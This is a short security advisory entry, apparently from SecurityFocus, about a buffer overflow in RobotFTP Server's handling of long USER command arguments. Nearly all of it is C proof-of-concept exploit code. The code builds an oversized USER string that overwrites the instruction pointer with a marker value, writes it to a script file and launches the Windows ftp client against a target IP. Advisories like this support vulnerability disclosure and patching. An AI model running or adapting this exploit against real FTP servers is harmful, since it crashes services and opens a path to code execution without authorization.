source: http://www.securityfocus.com/bid/9672/info

A vulnerability has been reported for RobotFTP Server. The problem likely occurs due to insufficient bounds checking when processing 'USER' command arguments of excessive length.

/******************************
this is example code for the vulnerability. It uses the windows ftp client to connect to a server
******************************/
#include <stdio.h>

char buffer[2500];
char cmd[50];

int main(int argc, char *argv[])
{
        FILE *evil;

        if(argv[1] == NULL)
        {
                printf("Usage: %s [IP]\n\n",argv[0]);
                return 0;
        }

        memset(buffer,0x41,47);
        memcpy(buffer+47,"\r\n",2);
        memcpy(buffer+49,"crash",5);
        memcpy(buffer+54,"\r\n",2);
        memcpy(buffer+56,"USER ",5);
        memset(buffer+61,0x41,1989);
        memset(buffer+61+1989,0x58,4);  // << overwrites the eip with XXXX
        memcpy(buffer+65+1989,"\r\n",2);

        sprintf(cmd,"ftp -s:ftp.txt %s",argv[1]);


        if((evil = fopen("ftp.txt", "a+")) != NULL)
        {
                fputs(buffer, evil);
                fclose(evil);
                printf("- file written!\n");
        }
        else
        {
                fprintf(stderr, "ERROR: couldn't open ftp.txt!\n");
                exit(1);
        }
        system(cmd);

}
/*******************************/